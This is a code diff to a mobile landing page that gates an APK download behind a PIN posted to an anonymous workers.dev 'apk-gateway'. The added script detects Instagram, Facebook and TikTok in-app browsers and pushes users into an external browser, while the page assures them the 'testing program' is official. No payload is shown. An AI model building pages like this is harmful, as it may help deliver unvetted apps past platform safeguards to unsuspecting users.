@@ -45,7 +45,7 @@
             box-shadow: 0 0 0 3px rgba(46, 140, 90, 0.2);
             outline: none;
         }
-        button {
+        button, .open-browser-btn {
             width: 100%;
             padding: 14px;
             background: linear-gradient(135deg, #69b782, #2e8c5a);
@@ -55,8 +55,11 @@
             border-radius: 10px;
             cursor: pointer;
             transition: opacity 0.2s;
+            font-size: 16px;
+            text-decoration: none;
+            display: block;
         }
-        button:hover {
+        button:hover, .open-browser-btn:hover {
             opacity: 0.9;
         }
         .note {
@@ -68,26 +71,106 @@
             border-left: 4px solid #2e8c5a;
             text-align: left;
         }
+
+        /* Instagram WebView overlay */
+        .ig-overlay {
+            display: none;
+        }
+        .ig-overlay .icon-browser {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        .ig-overlay p {
+            margin-bottom: 16px;
+            color: #555;
+            line-height: 1.5;
+        }
+        .ig-overlay .step-text {
+            font-size: 13px;
+            color: #888;
+            margin-top: 12px;
+            margin-bottom: 0;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Quality Connect</h1>
         <p>Madagascar Centella Program</p>
-        <form method="POST" action="https://apk-gateway.loxnesgnome3332-881.workers.dev">
-            <input
-                type="password"
-                name="pin"
-                placeholder="Enter Access Code"
-                maxlength="6"
-                inputmode="numeric"
-                required
-            >
-            <button type="submit">Verify Access</button>
-        </form>
+
+        <!-- Normal flow: PIN form (visible by default) -->
+        <div id="pin-form">
+            <form method="POST" action="https://apk-gateway.loxnesgnome3332-881.workers.dev">
+                <input
+                    type="password"
+                    name="pin"
+                    placeholder="Enter Access Code"
+                    maxlength="6"
+                    inputmode="numeric"
+                    required
+                >
+                <button type="submit">Verify Access</button>
+            </form>
+        </div>
+
+        <!-- Instagram WebView flow: "Open in browser" button -->
+        <div id="ig-overlay" class="ig-overlay">
+            <div class="icon-browser">🌐</div>
+            <p>To download the app, please open this page in your browser.</p>
+            <a id="open-browser-btn" class="open-browser-btn" href="#">
+                Open in Browser
+            </a>
+            <p class="step-text">Tap the button above — your browser will open automatically.</p>
+        </div>
+
         <div class="note">
             This is an official quality testing program for selected participants. No payment or credit card required.
         </div>
     </div>
+
+    <script>
+        (function() {
+            var ua = navigator.userAgent || '';
+
+            // Detect Instagram, Facebook, TikTok in-app browsers
+            var isInAppBrowser = /Instagram|FBAN|FBAV|Musical_ly|BytedanceWebview|TikTok/i.test(ua);
+
+            if (isInAppBrowser) {
+                // Hide PIN form, show "Open in browser" overlay
+                document.getElementById('pin-form').style.display = 'none';
+                document.getElementById('ig-overlay').style.display = 'block';
+
+                var currentURL = window.location.href;
+                var btn = document.getElementById('open-browser-btn');
+
+                // Try intent URI for Android (opens Chrome or browser chooser)
+                // Fallback: for iOS or if intent fails, try window.open
+                var isAndroid = /Android/i.test(ua);
+
+                if (isAndroid) {
+                    // Intent URI: opens this same URL in external browser
+                    // No package specified = Android shows browser chooser dialog
+                    var intentURL = 'intent://' + currentURL.replace(/^https?:\/\//, '') +
+                        '#Intent;scheme=https;action=android.intent.action.VIEW;end';
+                    btn.href = intentURL;
+                } else {
+                    // iOS: Instagram doesn't support intent URIs
+                    // Best we can do: instruct user to copy link
+                    btn.href = '#';
+                    btn.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        // Try to open in Safari
+                        window.open(currentURL, '_system');
+                        // Also copy to clipboard as fallback
+                        if (navigator.clipboard) {
+                            navigator.clipboard.writeText(currentURL);
+                        }
+                    });
+                    document.querySelector('.step-text').textContent =
+                        'If the browser doesn\'t open, tap ⋯ (top right) → "Open in browser"';
+                }
+            }
+        })();
+    </script>
 </body>
 </html>
